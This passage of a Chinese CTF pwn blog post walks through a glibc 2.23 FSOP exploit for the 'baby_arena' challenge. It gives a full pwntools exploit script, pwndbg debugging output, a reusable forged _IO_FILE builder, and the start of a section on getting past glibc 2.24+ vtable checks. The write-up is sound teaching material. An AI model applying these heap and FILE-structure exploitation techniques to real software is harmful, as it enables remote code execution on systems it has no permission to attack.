src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175336933.png" alt="image-20220524175336933"></p><p>溢出的情形，调试部分再写。</p><h5 id="思路"><a class="header-anchor" href="#思路">¶</a>思路</h5><ol><li>简单的 Leak libc 之后利用任意写在 <code>global_max_fast</code> 上写 <code>admin</code>  改大我们的 fastbin 大小。</li><li>算好偏移把我们的堆块送到 <code>_IO_list_all</code> 的坑上去，伪造 <code>_IO_FILE</code> 的 <strong>vtable</strong> 后 <code>exit</code> 触发 <code>FSOP</code> 就结束了。需要注意的是 vtable 是一张函数表，我们为了简单的定位我们需要的函数。选择利用 <strong>login</strong> 函数同时在 bss 段写上 onegadget。</li><li>这部分并不复杂,具体的我写在下面的调试步骤了。</li></ol><h5 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.23/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1400</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3c4b78</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>,one_gadget)<br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3c37a0</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br>aw(one_gadget,libc_base+<span class="hljs-number">0x3c67f8</span>-<span class="hljs-number">8</span>)<br>pause()<br><br>dele(<span class="hljs-number">1</span>)<br><br>fake_IO = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x1400</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="调试"><a class="header-anchor" href="#调试">¶</a>调试</h5><p><strong>首先看看 global_max_fast 这部分。</strong></p><p>在我们写 <code>admin</code> 之前：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000000000000080</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>写 <code>admin</code> 之后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000006e696d6461</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/s <span class="hljs-number">0x7f6a347977f8</span><br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>释放大堆块前：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00007f6a34796540</span><br>pwndbg&gt; x/xg <span class="hljs-number">0x00007f6a34796540</span><br><span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt;:       <span class="hljs-number">0x00000000fbad2086</span><br></code></pre></td></tr></table></figure><p>释放大堆块后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00000000008b9420</span><br></code></pre></td></tr></table></figure><p>可以看到我们的 _IO_list_all 成功的被我们堆地址取代了。从而我们控制了遍历 IO 结构体时的整个流程。</p><p>其中偏移计算（这里我重新运行了所以和上面地址不同但思路不影响）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p &amp;main_arena.fastbinsY<br>$<span class="hljs-number">5</span> = (mfastbinptr (*)[<span class="hljs-number">10</span>]) <span class="hljs-number">0x7f8a7d7b0b28</span> &lt;main_arena+<span class="hljs-number">8</span>&gt;<br>pwndbg&gt; p &amp;_IO_list_all<br>$<span class="hljs-number">6</span> = (struct _IO_FILE_plus **) <span class="hljs-number">0x7f8a7d7b1520</span> &lt;_IO_list_all&gt;<br>pwndbg&gt; p/x <span class="hljs-number">0x7f8a7d7b1520</span>-<span class="hljs-number">0x7f8a7d7b0b28</span><br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x9f8</span><br>pwndbg&gt; p/x <span class="hljs-number">2</span>*<span class="hljs-number">0x9f8</span>+<span class="hljs-number">0x10</span><br>$<span class="hljs-number">8</span> = <span class="hljs-number">0x1400</span><br></code></pre></td></tr></table></figure><p><strong>再用 <code>fp</code> 看看我们伪造的 IO 结构体。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; fp <span class="hljs-number">0x8b9420</span><br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">1056</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x1411</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1411</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt; <span class="hljs-string">&quot;\206 \255&quot;</span>, &lt;incomplete sequence \<span class="hljs-number">373</span>&gt;,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x602098</span> &lt;completed&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的重点是我们劫持的 vtable：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p *(const struct _IO_jump_t *)<span class="hljs-number">0x602098</span><br>$<span class="hljs-number">4</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = <span class="hljs-number">0x7f6a344c2247</span> &lt;exec_comm+<span class="hljs-number">2263</span>&gt;,<br>  __underflow = <span class="hljs-number">0x0</span>,<br>  __uflow = <span class="hljs-number">0x0</span>,<br>  __pbackfail = <span class="hljs-number">0x0</span>,<br>  __xsputn = <span class="hljs-number">0x0</span>,<br>  __xsgetn = <span class="hljs-number">0x0</span>,<br>  __seekoff = <span class="hljs-number">0x8b9010</span>,<br>  __seekpos = <span class="hljs-number">0x0</span>,<br>  __setbuf = <span class="hljs-number">0x0</span>,<br>  __sync = <span class="hljs-number">0x0</span>,<br>  __doallocate = <span class="hljs-number">0x0</span>,<br>  __read = <span class="hljs-number">0x0</span>,<br>  __write = <span class="hljs-number">0x0</span>,<br>  __seek = <span class="hljs-number">0x0</span>,<br>  __close = <span class="hljs-number">0x0</span>,<br>  __stat = <span class="hljs-number">0x0</span>,<br>  __showmanyc = <span class="hljs-number">0x0</span>,<br>  __imbue = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 <code>__overflow</code> 位置已经被写上了我们的 onegadget 。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525000410526.png" alt="image-20220525000410526"></p><p>满足进入条件后，在 <code>_IO_cleanup</code> 的 <code>_IO_flush_all_lockp</code> 函数里面会调用结构体 vtable 的 <code>_IO_OVERFLOW</code> 函数，也就是我们提前替代好的 <code>one_gadget</code> 。</p><p><strong>进入 _IO_OVERFLOW 条件：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-number">779</span>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>  <span class="hljs-number">780</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-number">781</span>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>  <span class="hljs-number">782</span>         &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>  <span class="hljs-number">783</span>                              &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>  <span class="hljs-number">784</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-number">785</span>     )<br>► <span class="hljs-number">786</span>    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>别看这都是 if 判断语句，这玩意遵循一个<strong>短路原则</strong>，就是如果已经有条件可以判断出 if 为假，就不会去执行剩下的判断语句。所以我们要成功的调用 <code>_IO_OVERFLOW</code> ，就要保证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>如果你想不开去保证另外一堆条件当然也是可以的。</p><p>调试部分到此就结束了。</p><p>此外，稍微提一句就是这题我们如果在 bss 段写的是 system 的话，结构体也可以这样构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525001739503.png" alt="image-20220525001739503"></p><p>这时候的 <strong>_IO_OVERFLOW</strong> 就等同于 <code>system('/bin/sh\0');</code> 能稳定 getshell。</p><h5 id="注意"><a class="header-anchor" href="#注意">¶</a>注意</h5><p>注意的点就是，我们 _IO_list_all 写的是堆地址，<strong>我们的 _flags 和 _IO_read_ptr 是被 prev_size 和 size 占据</strong>的。这就是为毛我们写的内容是 <code>fake_IO[0x10:]</code> 。</p><p>所以想要第二种方法 getshell 的话要记得更改上个 chunk 在 prev_size 位的数据。最后正常 getshell ：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525122757746.png" alt="image-20220525122757746"></p><h3 id="基本构造"><a class="header-anchor" href="#基本构造">¶</a>基本构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">vtable_addr</span>):<br>    fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> <span class="hljs-comment"># _mode &lt;= 0</span><br>    fake_IO += p64(vtable_addr - <span class="hljs-number">0x18</span>)<br>    <span class="hljs-keyword">return</span> fake_IO<br></code></pre></td></tr></table></figure><hr><h2 id="2-24-Libc-2-27-3ubuntu1-2"><a class="header-anchor" href="#2-24-Libc-2-27-3ubuntu1-2">¶</a>2.24 =&lt; Libc &lt;= 2.27-3ubuntu1.2</h2><p>为毛是 2.27-3ubuntu1.2 是因为下面这俩 👴 在 2.27-3ubuntu1.4 试过了不行。</p><h3 id="vtable-检测绕过"><a class="header-anchor" href="#vtable-检测绕过">¶</a>vtable 检测绕过</h3><h4 id="没啥必要看的检查代码"><a class="header-anchor" href="#没啥必要看的检查代码">¶</a>没啥必要看的检查代码</h4><p>Libc 2.24 往上走就有了对 vtable 的检查。但基本思路还是没有变，劫持函数指针，只要掌握绕过思路本质还是一样的。</p><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。</p><p>首先会验证 vtable 是否位于 <strong>_IO_vtable</strong> 段（段内一定偏移范围还是比较宽松的）中，如果满足条件就正常执行，否则会调用 *** _IO_vtable_check*** 做进一步合法性检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the 